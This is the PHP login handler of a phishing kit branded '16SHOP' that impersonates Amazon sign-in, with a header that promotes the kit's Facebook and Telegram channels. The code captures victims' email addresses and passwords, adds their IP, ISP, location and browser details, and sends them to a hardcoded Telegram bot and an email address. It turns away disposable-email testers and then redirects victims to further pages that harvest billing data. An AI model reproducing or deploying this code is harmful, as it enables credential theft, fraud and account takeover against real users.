<?php
/*
____            _             ____       _            _           ___   ___  
/ ___|  ___  ___| |_ ___  _ __|  _ \ _ __(_)_   ____ _| |_ ___    ( _ ) ( _ ) 
\___ \ / _ \/ __| __/ _ \| '__| |_) | '__| \ \ / / _` | __/ _ \   / _ \ / _ \ 
 ___) |  __/ (__| || (_) | |  |  __/| |  | |\ V / (_| | ||  __/  | (_) | (_) |
|____/ \___|\___|\__\___/|_|  |_|   |_|  |_| \_/ \__,_|\__\___|___\___/ \___/ 
                                                             |_____|          

Join our community
Facebook Groups : https://www.facebook.com/groups/621105481775437/
Telegram Chanel : https://t.me/sectorprivate88
Need our help : sectorprivate88 [at] gmail.com

if link die you can find at (https://pastebin.com/2bwFRSjP) for updated link

*/
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
require_once('../session.php');
$ip = getUserIP();
if(strlen($_POST['emailLogin']) < 6) {
  tulis_file("../security/onetime.dat","$ip");
header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

if($_POST['emailLogin'] == "") {
  tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['passwordLogin'] == "") {
  echo "<script type='text/javascript'>window.top.location='../ap/signin?session=$key&pass=1&email=".$_POST['emailLogin']."';</script>";
  exit();
}
 if(preg_match("/mailinator|yatdew.com|mteen.net|tf-info.com|theaccessuk.org|fuds.net|fuck/", $_POST['emailLogin'])){
  tulis_file("../security/onetime.dat","$ip");
             header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$ispuser = getisp($ip);
$message  = "#--------------------[ 16SHOP - AMAZON LOGIN ]-------------------------#\n";
$message .= "Amazon		: ".$_POST['emailLogin']."\n";
$message .= "Password		: ".$_POST['passwordLogin']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ NEW SCAMA ]-----------------------------#\n";
$data = [
    'chat_id' => '-774554678',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot5222632219:AAHKCIZpXH4JAsk52bht3bMBBLZYDUWI-cA/sendMessage?" . http_build_query($data) );
$_SESSION['email'] = $_POST['emailLogin'];
$_SESSION['password'] = $_POST['passwordLogin'];
if($setting['send_login'] == 'on') {
  $subject = "AMAZON LOGIN: ".$_POST['user']." [ $cn - $os - $ip ]";
  kirim_mail($setting['email_result'], "Amazon Login", $subject, $message);
}
tulis_file("../result/total_login.txt", $ip);
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Login Amazon");
if($setting['get_email'] == "on") {
	echo "<script type='text/javascript'>window.top.location='../ap/email?session=$key';</script>";
exit();
}else{
echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";
exit();
}
?>
